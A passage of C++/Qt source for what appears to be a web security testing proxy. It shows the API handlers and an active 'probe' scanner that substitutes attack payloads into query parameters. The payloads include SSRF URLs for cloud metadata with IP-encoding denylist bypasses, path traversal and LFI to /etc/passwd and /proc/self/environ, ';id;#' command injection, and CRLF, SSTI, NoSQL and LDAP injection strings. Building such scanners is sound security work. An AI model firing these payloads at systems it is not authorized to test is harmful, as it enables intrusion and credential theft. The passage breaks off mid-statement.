            oast["confirmed"]  = m_wiring.oastCorrelator->confirmedCount();
        }
        if (m_wiring.dnsSink) {
            oast["dnsRunning"] = m_wiring.dnsSink->running();
            oast["dnsPort"]    = m_wiring.dnsSink->port();
            oast["dnsHits"]    = m_wiring.dnsSink->hitCount();
        }
        root["oast"] = oast;
    }

    // Session handling rules: snapshot the rule list + currently-bound
    // variable bag.
    if (m_wiring.sessionRules) {
        QJsonObject sr;
        QJsonArray rules;
        for (const auto &r : m_wiring.sessionRules->rules()) {
            QJsonObject o;
            o["name"]           = r.name;
            o["enabled"]        = r.enabled;
            o["hostGlob"]       = r.hostGlob;
            o["pathGlob"]       = r.pathGlob;
            o["extractFrom"]    = r.extractFrom;
            o["extractKey"]     = r.extractKey;
            o["variable"]       = r.variable;
            o["injectInto"]     = r.injectInto;
            o["injectKey"]      = r.injectKey;
            o["injectTemplate"] = r.injectTemplate;
            rules.append(o);
        }
        sr["rules"] = rules;
        QJsonObject vars;
        const auto bag = m_wiring.sessionRules->variables();
        for (auto it = bag.cbegin(); it != bag.cend(); ++it)
            vars[it.key()] = it.value();
        sr["variables"] = vars;
        root["sessionRules"] = sr;
    }

    return QJsonDocument(root).toJson(QJsonDocument::Compact);
}

QByteArray ControlServer::buildHistoryRow(int id, bool wantRequest) const {
    if (!m_wiring.history) return {};
    // Prefer the in-memory ProxyModel -- O(1) lookup, full structs.
    // If the id has been evicted from the window (200k-row engagement,
    // bounded window), fall back to the SQLite index which carries the
    // full req_json / resp_json blobs.
    const QString fromModel = wantRequest
        ? m_wiring.history->requestRawById(id)
        : m_wiring.history->responseRawById(id);
    if (!fromModel.isEmpty()) return fromModel.toUtf8();
    if (m_wiring.projectStore) {
        auto *idx = m_wiring.projectStore->historyIndex();
        if (idx && idx->isOpen()) {
            const QString cold = wantRequest
                ? idx->loadFullRequestRaw(id)
                : idx->loadFullResponseRaw(id);
            if (!cold.isEmpty()) return cold.toUtf8();
        }
    }
    return {};
}

QByteArray ControlServer::apiResponse(const QString &method, const QString &path,
                                       const QByteArray &body,
                                       const QString &query) const {
    // Method dispatch -- read-only endpoints accept GET; everything else
    // is treated as a state-mutating action and requires POST. This closes
    // the GET-via-<img> CSRF avenue on /api/history/<id>/probe + replay
    // and friends (where the old check only ran at the top-level guard).
    auto isReadPath = [](const QString &p) {
        return p == "/api/snapshot"
            || p == "/api/pac" || p == "/proxy.pac"
            || p == "/api/search"
            || p == "/api/project/list"
            || p == "/api/ws/sessions"
            || p == "/api/h2/streams"
            || p == "/api/h2/events"
            || p == "/api/oast/poll"
            || p == "/api/openapi/export"
            || p == "/api/cookies"
            || p == "/api/project/templates"
            || p == "/api/findings/grouped"
            || p == "/api/inventory"
            || p == "/api/posture"
            || p == "/api/compliance"
            || p == "/api/report/json"
            || p == "/api/cve/overlay"
            || p == "/api/baseline/diff"
            || p == "/api/baseline/status"
            || p.startsWith("/api/export/")
            || p.startsWith("/api/history/full/")
            // /api/history/<id>/request  or  /response  but NOT /probe or /replay
            || (p.startsWith("/api/history/")
                && (p.endsWith("/request") || p.endsWith("/response")));
    };
    if (!isReadPath(path) && method != "POST") {
        return httpResponse(405, "text/plain",
            "Use POST for mutating endpoints (see README)");
    }

    // GET /api/pac -- proxy auto-config file. Drop the URL into a browser's
    // "Automatic proxy configuration" field and everything routes through
    // our listener with no manual host/port juggling.
    if (path == "/api/pac" || path == "/proxy.pac") {
        const quint16 pport = m_wiring.proxy ? m_wiring.proxy->listeningPort() : 8888;
        QByteArray pac;
        pac += "// Nullock proxy auto-config -- generated " +
               QDateTime::currentDateTime().toString(Qt::ISODate).toUtf8() + "\n";
        pac += "function FindProxyForURL(url, host) {\n";
        pac += "    // Local traffic stays direct so the control UI keeps working.\n";
        pac += "    if (isPlainHostName(host)\n";
        pac += "        || shExpMatch(host, \"localhost\")\n";
        pac += "        || shExpMatch(host, \"127.*\")\n";
        pac += "        || shExpMatch(host, \"10.*\")\n";
        pac += "        || shExpMatch(host, \"192.168.*\")\n";
        pac += "        || shExpMatch(host, \"172.16.*\") || shExpMatch(host, \"172.17.*\")\n";
        pac += "        || shExpMatch(host, \"172.18.*\") || shExpMatch(host, \"172.19.*\")\n";
        pac += "        || shExpMatch(host, \"172.2?.*\")  || shExpMatch(host, \"172.30.*\")\n";
        pac += "        || shExpMatch(host, \"172.31.*\")) {\n";
        pac += "        return \"DIRECT\";\n";
        pac += "    }\n";
        pac += "    return \"PROXY 127.0.0.1:" + QByteArray::number(pport) + "\";\n";
        pac += "}\n";
        return httpResponse(200, "application/x-ns-proxy-autoconfig; charset=utf-8", pac);
    }

    // GET /api/search?q=<regex>&where=req|resp|both&limit=N
    // Scans every history row's request and/or response text for the
    // pattern and returns a list of { id, where, excerpt }. Bodies are
    // pulled from ProxyModel's cache which is already memoized, so
    // calling this is cheap even for hundreds of rows.
    if (path == "/api/search") {
        QJsonArray hits;
        if (m_wiring.history) {
            const QUrlQuery q(query);
            const QString pattern = q.queryItemValue("q");
            QString where = q.queryItemValue("where");
            if (where.isEmpty()) where = "both";
            const int limit = q.queryItemValue("limit").toInt() > 0
                                ? q.queryItemValue("limit").toInt() : 200;
            // ReDoS defence. Qt's PCRE backend doesn't expose a match-time
            // budget, so a hostile pattern like (a+)+$ run against MB of
            // captured body backtracks for tens of seconds and freezes
            // the whole API surface. Three guards:
            //  1. Cap pattern length -- bombs are usually short, but a
            //     malicious one inside a megabyte of legitimate text is
            //     just noise.
            //  2. Reject patterns whose shape screams "nested unbounded
            //     quantifier" -- the textbook bomb pattern. Heuristic,
            //     but the cost of a false positive is "user rewrites a
            //     weird regex," which is fine.
            //  3. Truncate each body to kSearchBodyCap and cap the total
            //     rows scanned. A 200-row × 1 MB scan completes in
            //     reasonable wall-clock even if the pattern is awkward.
            constexpr int kPatternMax     = 4 * 1024;
            constexpr int kSearchBodyCap  = 1 * 1024 * 1024;
            constexpr int kSearchRowCap   = 500;
            if (pattern.size() > kPatternMax) {
                return httpJson(400, QJsonObject{{ "error",
                    "search pattern too long (max 4 KB)" }});
            }
            static const QRegularExpression kBombShape(
                R"(\([^)]*[*+]\)[*+]|\([^)]*\{\d+,\}\)[*+])",
                QRegularExpression::NoPatternOption);
            if (kBombShape.match(pattern).hasMatch()) {
                return httpJson(400, QJsonObject{{ "error",
                    "search pattern contains nested unbounded quantifier "
                    "(potential catastrophic backtrack); rewrite or use a "
                    "narrower pattern" }});
            }
            if (!pattern.isEmpty()) {
                const QRegularExpression rx(pattern,
                    QRegularExpression::CaseInsensitiveOption
                  | QRegularExpression::MultilineOption);
                if (rx.isValid()) {
                    const int n = m_wiring.history->rowCount();
                    auto scan = [&](int row, const QString &text,
                                    const QString &whereLabel) {
                        if (hits.size() >= limit) return;
                        auto it = rx.globalMatch(text);
                        if (!it.hasNext()) return;
                        // Pull at most 3 line-excerpts per hit so the
                        // response stays small.
                        QStringList excerpts;
                        int count = 0;
                        while (it.hasNext() && count < 3) {
                            const auto m = it.next();
                            // Grab the line containing the match.
                            const int start = m.capturedStart();
                            int ls = text.lastIndexOf('\n', start - 1) + 1;
                            int le = text.indexOf('\n', start);
                            if (le < 0) le = text.size();
                            QString line = text.mid(ls, le - ls).trimmed();
                            if (line.size() > 240) line = line.left(237) + "...";
                            excerpts.append(line);
                            ++count;
                        }
                        QJsonObject hit;
                        const QModelIndex idx = m_wiring.history->index(row, 0);
                        const int id = m_wiring.history->data(idx,
                            Nullock::FrontEnd::ProxyModel::IdRole).toInt();
                        hit["id"]       = id;
                        hit["where"]    = whereLabel;
                        hit["excerpts"] = QJsonArray::fromStringList(excerpts);
                        hits.append(hit);
                    };
                    const int rowLoopMax = std::min(n, kSearchRowCap);
                    for (int row = 0; row < rowLoopMax && hits.size() < limit; ++row) {
                        if (where == "req" || where == "both") {
                            QString t = m_wiring.history->requestRawAt(row);
                            if (t.size() > kSearchBodyCap) t = t.left(kSearchBodyCap);
                            if (!t.isEmpty()) scan(row, t, "req");
                        }
                        if (hits.size() >= limit) break;
                        if (where == "resp" || where == "both") {
                            QString t = m_wiring.history->responseRawAt(row);
                            if (t.size() > kSearchBodyCap) t = t.left(kSearchBodyCap);
                            if (!t.isEmpty()) scan(row, t, "resp");
                        }
                    }
                } else {
                    return httpJson(400, QJsonObject{{ "error", "invalid regex" }});
                }
            }
        }
        QJsonObject root;
        root["hits"]  = hits;
        root["count"] = hits.size();
        return httpJson(200, root);
    }

    // ---- OAST (out-of-band callback sink) -----------------------------
    // GET /api/oast/poll?since=<id>  -- list new hits since <id>
    if (path == "/api/oast/poll") {
        if (!m_wiring.oast) return httpJson(200, QJsonObject{{ "running", false }});
        qint64 sinceId = 0;
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            sinceId = q.queryItemValue("since").toLongLong();
        }
        QJsonArray arr;
        for (const auto &h : m_wiring.oast->hitsSince(sinceId)) {
            QJsonObject o;
            o["id"]         = static_cast<double>(h.id);
            o["atMs"]       = static_cast<double>(h.atMs);
            o["token"]      = h.token;
            o["sourceIp"]   = h.sourceIp;
            o["method"]     = h.method;
            o["hostHeader"] = h.hostHeader;
            o["path"]       = h.path;
            o["bodyBytes"]  = h.bodyBytes;
            o["userAgent"]  = h.userAgent;
            o["bodyPreview"] = h.bodyPreview;
            arr.append(o);
        }
        QJsonObject root;
        root["running"] = m_wiring.oast->running();
        root["port"]    = m_wiring.oast->port();
        root["baseHost"] = m_wiring.oast->baseHost();
        root["hits"]    = arr;
        return httpJson(200, root);
    }

    // GET /api/h2/streams -- list every captured h2 stream summary.
    if (path == "/api/h2/streams") {
        QJsonArray arr;
        for (const auto &s : Nullock::Proxy::H2EventLog::instance()->streams()) {
            QJsonObject o;
            o["streamId"]   = s.streamId;
            o["conn"]       = s.conn;
            o["method"]     = s.method;
            o["path"]       = s.path;
            o["status"]     = s.status;
            o["bytesIn"]    = static_cast<double>(s.bytesIn);
            o["bytesOut"]   = static_cast<double>(s.bytesOut);
            o["framesIn"]   = s.framesIn;
            o["framesOut"]  = s.framesOut;
            o["lastError"]  = static_cast<int>(s.lastError);
            o["openedAtMs"] = static_cast<double>(s.openedAtMs);
            o["closed"]     = s.closed;
            arr.append(o);
        }
        QJsonObject r;  r["streams"] = arr;
        return httpJson(200, r);
    }

    // GET /api/h2/events?since=<ms> -- raw h2 frame stream.
    if (path == "/api/h2/events") {
        qint64 sinceTs = 0;
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            sinceTs = q.queryItemValue("since").toLongLong();
        }
        QJsonArray arr;
        const char *kTypes[] = {
            "DATA", "HEADERS", "PRIORITY", "RST_STREAM", "SETTINGS",
            "PUSH_PROMISE", "PING", "GOAWAY", "WINDOW_UPDATE", "CONTINUATION"
        };
        for (const auto &e : Nullock::Proxy::H2EventLog::instance()->eventsSince(sinceTs)) {
            QJsonObject o;
            o["ts"]        = static_cast<double>(e.ts);
            o["conn"]      = e.conn;
            o["type"]      = (e.frameType < 10)
                               ? QString::fromLatin1(kTypes[e.frameType])
                               : QString::number(e.frameType);
            o["flags"]     = e.flags;
            o["streamId"]  = e.streamId;
            o["bytes"]     = static_cast<double>(e.bytes);
            o["errorCode"] = static_cast<int>(e.errorCode);
            arr.append(o);
        }
        QJsonObject r;  r["events"] = arr;
        return httpJson(200, r);
    }

    if (path == "/api/ws/sessions") {
        QJsonArray arr;
        for (const auto &s : Nullock::Proxy::WsRepeater::instance()->sessions()) {
            QJsonObject o;
            o["id"]         = static_cast<double>(s.id);
            o["host"]       = s.host;
            o["port"]       = s.port;
            o["openedAtMs"] = static_cast<double>(s.openedAtMs);
            o["framesUp"]   = static_cast<double>(s.framesUp);
            o["framesDown"] = static_cast<double>(s.framesDown);
            arr.append(o);
        }
        QJsonObject root;
        root["sessions"] = arr;
        return httpJson(200, root);
    }

    if (path == "/api/snapshot") {
        // ?since=<seq> -> 304 if seq hasn't moved. Saves us building 13 KB
        // of JSON twice a second when nothing has happened.
        if (!query.isEmpty()) {
            const QUrlQuery q(query);   // raw query string; no leading '?'
            const QString since = q.queryItemValue("since");
            bool ok = false;
            const quint64 sinceSeq = since.toULongLong(&ok);
            if (ok && sinceSeq == m_seq)
                return httpResponse(304, "application/json", "{}", "Not Modified");
        }
        return httpResponse(200, "application/json; charset=utf-8", buildSnapshot());
    }

    // /api/history/{id}/request  or  /api/history/{id}/response
    if (path.startsWith("/api/history/")) {
        const QString rest = path.mid(QStringLiteral("/api/history/").size());
        const QStringList parts = rest.split('/');
        if (parts.size() == 2) {
            bool ok = false;
            const int id = parts[0].toInt(&ok);
            if (ok) {
                if (parts[1] == "probe") {
                    // Light active scan: walk the query params, substitute
                    // each value with a unique canary that contains HTML
                    // metacharacters, replay, scan the response body for
                    // the canary verbatim. If it reflects unencoded -> a
                    // candidate XSS sink. Emits Findings via the scanner's
                    // public reportFinding hook. Fire-and-forget; new
                    // findings show up in the next snapshot poll.
                    if (!m_wiring.history) return httpJson(404, QJsonObject{{ "error", "no history" }});
                    // Prefer the in-memory window; fall back to SQLite
                    // for evicted rows.
                    auto *src     = m_wiring.history->requestById(id);
                    auto *srcResp = m_wiring.history->responseById(id);
                    Nullock::Proxy::HttpRequest   coldReq;
                    Nullock::Proxy::HttpResponse  coldResp;
                    if (!src && m_wiring.projectStore) {
                        auto *idx = m_wiring.projectStore->historyIndex();
                        if (idx && idx->isOpen()) {
                            auto fr = idx->loadFullRow(id);
                            if (fr.ok) {
                                coldReq = std::move(fr.request);
                                coldResp = std::move(fr.response);
                                src     = &coldReq;
                                srcResp = &coldResp;
                            }
                        }
                    }
                    if (!src) return httpJson(404, QJsonObject{{ "error", "row not found" }});

                    const Nullock::Proxy::HttpRequest base = *src;

                    // Scope guard: refuse to fire active payloads at hosts
                    // the project does not consider in-scope. A malicious
                    // local web page that pivots through us would otherwise
                    // be able to attack arbitrary targets we'd once browsed.
                    if (m_wiring.proxy && !m_wiring.proxy->isInScope(base.host)) {
                        return httpJson(403, QJsonObject{
                            { "ok", false },
                            { "error", "row's host is out of scope; add it to "
                                       "Scope first if you really mean it" },
                        });
                    }

                    const bool useTls = srcResp ? srcResp->wasTls : false;

                    const int qmark = base.path.indexOf('?');
                    if (qmark < 0)
                        return httpJson(200, QJsonObject{{ "ok", true },
                                                          { "skipped", "no query params" }});
                    const QString prefix = base.path.left(qmark + 1);
                    const QStringList params =
                        base.path.mid(qmark + 1).split('&', Qt::SkipEmptyParts);
                    if (params.isEmpty())
                        return httpJson(200, QJsonObject{{ "ok", true },
                                                          { "skipped", "no params" }});

                    Wiring w = m_wiring;
                    const int rowId = id;  // 1-based -- same as snapshot id
                    const int srcStatusCode = srcResp ? srcResp->statusCode : 0;
                    (void)QtConcurrent::run([w, base, useTls, prefix, params, rowId, srcStatusCode]() {
                        Nullock::Core::HttpClient client;
                        const QString proto = useTls ? "https" : "http";
                        const QString hostPort  = (base.port == 80 || base.port == 443)
                                                  ? QString() : ":" + QString::number(base.port);
                        const QString baseUrl   = proto + "://" + base.host + hostPort + base.path;

                        auto report = [w, rowId, baseUrl, host = base.host]
                                      (const QString &sev, const QString &kind,
                                       const QString &summary, const QString &evidence) {
                            if (!w.scanner) return;
                            QMetaObject::invokeMethod(w.scanner, [w, rowId, host, baseUrl, sev, kind, summary, evidence]() {
                                w.scanner->reportFinding(rowId, sev, kind, summary,
                                                         evidence, host, baseUrl);
                            }, Qt::QueuedConnection);
                        };

                        // One worker fn: substitute param i with `payload`,
                        // run request through mutation pipeline, return result.
                        auto fire = [&](int i, const QString &payload) {
                            QStringList rewritten;
                            for (int j = 0; j < params.size(); ++j) {
                                if (j == i) {
                                    const QString p = params[j];
                                    const int eq = p.indexOf('=');
                                    const QString key = eq > 0 ? p.left(eq) : p;
                                    rewritten.append(key + "=" + payload);
                                } else {
                                    rewritten.append(params[j]);
                                }
                            }
                            Nullock::Proxy::HttpRequest r = base;
                            r.path = prefix + rewritten.join('&');
                            r.target = r.path;
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            const QByteArray bytes =
                                Nullock::Proxy::serializeRequestForOrigin(r);
                            return client.send(r.host,
                                static_cast<quint16>(r.port), useTls, bytes);
                        };

                        // Common SQL error fragments. Conservative list --
                        // false positives in the wild are worse than a
                        // missed hit, so only the ones I'd bet on.
                        static const char *kSqlErrSigs[] = {
                            "SQL syntax",                          // MySQL
                            "mysql_fetch_",
                            "ORA-",                                 // Oracle
                            "PostgreSQL query failed",
                            "psql:",
                            "PG::SyntaxError",
                            "Unclosed quotation mark",              // MS-SQL
                            "SQLSTATE[",                            // generic PDO
                            "syntax error at or near",              // Postgres
                            "Microsoft OLE DB Provider for ODBC",
                            "SQLite/JDBCDriver",
                            "sqlite3.OperationalError",
                        };

                        for (int i = 0; i < params.size(); ++i) {
                            const QString p = params[i];
                            const int eq = p.indexOf('=');
                            if (eq <= 0) continue;
                            const QString key = p.left(eq);
                            const QString tag = QString("%1").arg(
                                QRandomGenerator::global()->generate(),
                                8, 16, QChar('0'));

                            // ---- reflected XSS --------------------------------
                            {
                                const QString canary = "NL<x" + tag + ">";
                                const auto res = fire(i, canary);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    if (body.contains(canary)) {
                                        report("high", "reflected-xss",
                                               "Param '" + key + "' reflects unencoded in response",
                                               "param=" + key + " · canary=" + canary
                                               + " · reflected unencoded in response body");
                                    }
                                }
                            }

                            // ---- open redirect --------------------------------
                            // Plain external URL canary. If the response is
                            // a 3xx and Location: contains this exact host,
                            // the server is redirecting based on user input.
                            {
                                const QString redirCanary =
                                    "https://nullock-canary-" + tag + ".invalid/";
                                const auto res = fire(i, redirCanary);
                                if (res.ok && res.parsed.statusCode >= 300
                                    && res.parsed.statusCode < 400) {
                                    QString loc;
                                    for (const auto &h : res.parsed.headers) {
                                        if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                            loc = h.second; break;
                                        }
                                    }
                                    if (!loc.isEmpty() && loc.contains("nullock-canary-" + tag)) {
                                        report("high", "open-redirect",
                                               "Param '" + key + "' controls the redirect target",
                                               "param=" + key + " · payload=" + redirCanary
                                               + " · Location: " + loc);
                                    }
                                }
                            }

                            // ---- SSRF via cloud metadata ----------------------
                            // If the response body contains telltale strings
                            // from AWS/GCP/Azure metadata endpoints after we
                            // injected those URLs as the param value, the
                            // server is fetching attacker-controlled URLs
                            // (SSRF). Highest-value cloud finding -- usually
                            // leads to credential theft.
                            {
                                // Mirrors the dedicated ssrf_scan probe: response-only
                                // signatures (never in the URL we sent), decimal/hex
                                // IP-encoding denylist bypasses, and a same-shape
                                // non-fetchable shaped-control URL so an error/WAF/echo
                                // template keyed on the input SHAPE can't false-positive.
                                // Case-SENSITIVE; JSON-key signatures quoted.
                                struct MetaProbe {
                                    const char *url;
                                    const char *control;
                                    const char *signature;
                                    const char *label;
                                };
                                static const MetaProbe kCloudMeta[] = {
                                    { "http://169.254.169.254/latest/meta-data/",
                                      "http://169.254.169.254/nullock-ssrf-zzq/", "ami-id", "aws-imds-v1" },
                                    { "http://2852039166/latest/meta-data/",
                                      "http://2852039166/nullock-ssrf-zzq/", "ami-id", "aws-imds-decimal" },
                                    { "http://0xA9FEA9FE/latest/meta-data/",
                                      "http://0xA9FEA9FE/nullock-ssrf-zzq/", "ami-id", "aws-imds-hex" },
                                    { "http://100.100.100.200/latest/meta-data/",
                                      "http://100.100.100.200/nullock-ssrf-zzq/", "ami-id", "aliyun-imds" },
                                    { "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                                      "http://169.254.169.254/metadata/nullock-ssrf-zzq?api-version=2021-02-01",
                                      "\"subscriptionId\"", "azure-imds" },
                                    { "http://metadata.google.internal/computeMetadata/v1/instance/",
                                      "http://metadata.google.internal/computeMetadata/v1/nullock-ssrf-zzq/",
                                      "service-accounts", "gcp-metadata" },
                                };
                                for (const auto &mp : kCloudMeta) {
                                    const auto res = fire(i, QString::fromLatin1(mp.url));
                                    if (!res.ok) continue;
                                    const QString sig = QString::fromLatin1(mp.signature);
                                    const QString body = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    if (!body.contains(sig)) continue;       // case-sensitive
                                    // Shaped control: same host/scheme, non-fetchable
                                    // path. If the signature is here too, it tracks the
                                    // input shape, not a fetch -- suppress.
                                    const auto ctl = fire(i, QString::fromLatin1(mp.control));
                                    if (ctl.ok && QString::fromUtf8(ctl.parsed.body.left(64 * 1024))
                                                      .contains(sig))
                                        break;
                                    report("critical", "ssrf-cloud-metadata",
                                           QString("Param '%1' triggers fetch of %2 metadata endpoint")
                                               .arg(key, QString::fromLatin1(mp.label)),
                                           QString("param=%1 · payload=%2 · response contained \"%3\" "
                                                   "(absent from a same-shape control)")
                                               .arg(key,
                                                    QString::fromLatin1(mp.url),
                                                    sig));
                                    break;  // one finding per param is enough
                                }
                            }

                            // ---- OAST out-of-band SSRF ----------------------
                            // Even when the response doesn't echo our payload,
                            // a server-side fetch can land at our OAST sink.
                            // Mint a token, embed the callback URL, fire; the
                            // /api/oast/poll endpoint later surfaces hits and
                            // ties them back to this row via the token.
                            if (w.oast && w.oast->running()) {
                                const auto tok = w.oast->mintToken();
                                const QString token   = tok.value("token").toString();
                                const QString hostUrl = tok.value("hostUrl").toString();
                                const QString pathUrl = tok.value("pathUrl").toString();
                                // Register BEFORE firing so a fast callback
                                // can't race ahead of the registry and be
                                // dropped as "unknown token".
                                if (w.oastCorrelator) {
                                    Nullock::Core::OastOrigin origin;
                                    origin.rowId = rowId;
                                    origin.host  = base.host;
                                    origin.param = key;
                                    origin.url   = pathUrl;
                                    origin.kind  = "ssrf-oast";
                                    w.oastCorrelator->registerToken(token, origin);
                                }
                                fire(i, pathUrl);   // fire-and-forget
                                fire(i, hostUrl);
                                report("info", "oast-token-fired",
                                       QString("Param '%1': OAST callback URLs embedded; "
                                               "a confirmed finding auto-appears if the "
                                               "target calls back").arg(key),
                                       QString("param=%1 · token=%2 · url=%3")
                                           .arg(key, token, pathUrl));
                            }

                            // ---- SQLi error ---------------------------------
                            // A single unbalanced quote often blows up an
                            // unparameterized query into a stack trace; we
                            // grep the response for known error fragments.
                            {
                                const QString sqlPayload = "'";
                                const auto res = fire(i, sqlPayload);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    QString hit;
                                    for (const char *sig : kSqlErrSigs) {
                                        if (body.contains(QString::fromLatin1(sig),
                                                          Qt::CaseInsensitive)) {
                                            hit = QString::fromLatin1(sig); break;
                                        }
                                    }
                                    if (!hit.isEmpty()) {
                                        report("high", "sqli-error",
                                               "Param '" + key + "' triggers a SQL error page",
                                               "param=" + key + " · payload=' · matched: " + hit);
                                    }
                                }
                            }

                            // ---- path traversal -----------------------------
                            // ../../../../etc/passwd canary. If the server
                            // includes our marker (root:x:0:0:) in the body,
                            // it served the local file.
                            {
                                const QString trav = "../../../../../../etc/passwd";
                                const auto res = fire(i, trav);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    if (body.contains("root:x:0:0:")
                                        || body.contains("daemon:x:1:1:")) {
                                        report("high", "path-traversal",
                                               "Param '" + key + "' resolves to /etc/passwd",
                                               "param=" + key + " · payload=" + trav
                                               + " · matched: root:x:0:0:");
                                    }
                                }
                            }

                            // ---- command injection (output channel) --------
                            // `;id` is the cheapest output-channel probe.
                            // We look for "uid=" in the body which is the
                            // canonical id(1) output. Quiet probes (sleep)
                            // require timing measurement and false-positive
                            // on slow upstreams, so output-channel only.
                            {
                                const QString cmdPayload = ";id;#";
                                const auto res = fire(i, cmdPayload);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    QRegularExpression rxUid(
                                        "uid=\\d+\\(.+\\) gid=\\d+");
                                    if (rxUid.match(body).hasMatch()) {
                                        report("high", "cmd-injection",
                                               "Param '" + key + "' executes shell commands",
                                               "param=" + key + " · payload=" + cmdPayload
                                               + " · uid=... line in response");
                                    }
                                }
                            }

                            // ---- CRLF header injection ---------------------
                            // Inject %0d%0a marker and look for it as a real
                            // header in the response. Some servers reflect the
                            // injected newline into a Set-Cookie or Location.
                            // No literal whitespace in the payload -- it
                            // would break the request line; %20 percent-
                            // encodes the space.
                            {
                                const QString crlfPayload =
                                    "x%0d%0aX-Nullock-Inject:%20" + tag;
                                const auto res = fire(i, crlfPayload);
                                if (res.ok) {
                                    bool found = false;
                                    for (const auto &h : res.parsed.headers) {
                                        if (h.first.compare("X-Nullock-Inject",
                                                            Qt::CaseInsensitive) == 0
                                            && h.second.contains(tag)) {
                                            found = true; break;
                                        }
                                    }
                                    if (found) {
                                        report("high", "crlf-injection",
                                               "Param '" + key + "' allows CRLF header injection",
                                               "param=" + key + " · payload=" + crlfPayload
                                               + " · injected header appeared in response");
                                    }
                                }
                            }

                            // ---- LFI (Local File Inclusion) ---------------
                            // Hit common targets with encoded depth variants.
                            // Confirm by looking for the unique signature of
                            // /etc/passwd ("root:x:") or win.ini ("[fonts]").
                            {
                                struct LfiP { const char *payload; const char *sig; };
                                static const LfiP kLfis[] = {
                                    { "../../../../etc/passwd",        "root:x:" },
                                    { "..%2f..%2f..%2f..%2fetc%2fpasswd",  "root:x:" },
                                    { "..%252f..%252f..%252fetc%252fpasswd","root:x:" },
                                    { "../../../../windows/win.ini",  "[fonts]" },
                                    { "..\\..\\..\\..\\windows\\win.ini","[fonts]" },
                                    { "../../../../proc/self/environ","PATH="    },
                                };
                                for (const auto &l : kLfis) {
                                    const auto res = fire(i, QString::fromLatin1(l.payload));
                                    if (!res.ok) continue;
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    if (b.contains(QString::fromLatin1(l.sig))) {
                                        report("critical", "lfi",
                                               "Param '" + key + "' reads local files",
                                               "param=" + key + " · payload=" + l.payload
                                               + " · signature=" + l.sig);
                                        break;  // one finding per param is enough
                                    }
                                }
                            }

                            // ---- SSTI (Server-Side Template Injection) ----
                            // Fire engine-specific {{7*7}}-style probes; look
                            // for "49" or analogous result in the response.
                            {
                                struct SstiP {
                                    const char *kind;
                                    const char *engine;
                                    const char *payload;
                                    const char *signature;
                                };
                                static const SstiP kSstis[] = {
                                    // Jinja2 / Twig / Liquid -- {{ math }}
                                    { "ssti-jinja-twig", "Jinja2/Twig",
                                      "{{7*7}}", "49" },
                                    // ERB (Ruby) -- <%= 7*7 %>
                                    { "ssti-erb",        "ERB",
                                      "<%25=7*7%25>", "49" },
                                    // Freemarker -- ${ 7*7 }
                                    { "ssti-freemarker", "Freemarker",
                                      "${7*7}", "49" },
                                    // Velocity / Tornado -- #set($x=7*7)$x
                                    { "ssti-velocity",   "Velocity",
                                      "#set($x=7*7)$x", "49" },
                                    // Smarty -- {7*7}
                                    { "ssti-smarty",     "Smarty",
                                      "{7*7}", "49" },
                                };
                                for (const auto &s : kSstis) {
                                    const auto res = fire(i, QString::fromLatin1(s.payload));
                                    if (!res.ok) continue;
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    // Require the signature AND that it wasn't
                                    // already in the original response (avoid
                                    // false positives from pages that just
                                    // happen to contain "49").
                                    if (b.contains(QString::fromLatin1(s.signature))) {
                                        report("critical", s.kind,
                                               QString("Param '%1' looks vulnerable to %2 SSTI (RCE-class)")
                                                   .arg(key, QString::fromLatin1(s.engine)),
                                               QString("param=%1 · payload=%2 · signature=%3 in response")
                                                   .arg(key, QString::fromLatin1(s.payload),
                                                        QString::fromLatin1(s.signature)));
                                        break;
                                    }
                                }
                            }

                            // ---- NoSQL injection (MongoDB) ----------------
                            // [$ne]= bypasses equality checks; [$gt]= same.
                            // We can't easily prove exploitation but a 200
                            // for one of these patterns when the original
                            // was 401/403 is a strong tell.
                            {
                                static const char *kNoSqlPayloads[] = {
                                    "[$ne]=", "[$gt]=", "[$exists]=true",
                                    "[$regex]=.%2A", "[$where]=1",
                                };
                                for (const char *p : kNoSqlPayloads) {
                                    const QString payload = QString::fromLatin1(p);
                                    const auto res = fire(i, payload);
                                    if (!res.ok) continue;
                                    // Heuristic: any unexpected 200 deserves
                                    // a flag for manual review.
                                    if (res.parsed.statusCode == 200
                                        && payload.startsWith("[$ne")) {
                                        report("medium", "nosql-injection-suspect",
                                               "Param '" + key + "' may be vulnerable to NoSQL operator injection",
                                               "param=" + key + " · payload=" + payload
                                               + " · status 200 -- review manually");
                                        break;
                                    }
                                }
                            }

                            // ---- LDAP injection ---------------------------
                            // Asterisk + boolean operators on auth-shaped
                            // endpoints. A 200 where you'd expect 401 = win.
                            if (key.compare("user", Qt::CaseInsensitive) == 0
                                || key.compare("username", Qt::CaseInsensitive) == 0
                                || key.compare("uid", Qt::CaseInsensitive) == 0
                                || key.compare("login", Qt::CaseInsensitive) == 0) {
                                static const char *kLdapPayloads[] = {
                                    "*", "*)(uid=*", "admin*", "*)(&", "*))%00",
                                };
                                for (const char *p : kLdapPayloads) {
                                    const QString payload = QString::fromLatin1(p);
                                    const auto res = fire(i, payload);
                                    if (!res.ok) continue;
                                    if (res.parsed.statusCode == 200) {
                                        report("medium", "ldap-injection-suspect",
                                               "Auth param '" + key + "' may be vulnerable to LDAP injection",
                                               "param=" + key + " · payload=" + payload
                                               + " · review manually");
                                        break;
                                    }
                                }
                            }

                            // ---- Mass assignment --------------------------
                            // POST/PUT bodies that accept JSON often blindly
                            // merge fields. Tag this row for manual review
                            // when there's a body and we can spot well-known
                            // privilege-shape field names.
                            if ((base.method == "POST" || base.method == "PUT"
                                 || base.method == "PATCH")
                                && (key.compare("admin", Qt::CaseInsensitive) == 0
                                    || key.compare("is_admin", Qt::CaseInsensitive) == 0
                                    || key.compare("isAdmin", Qt::CaseInsensitive) == 0
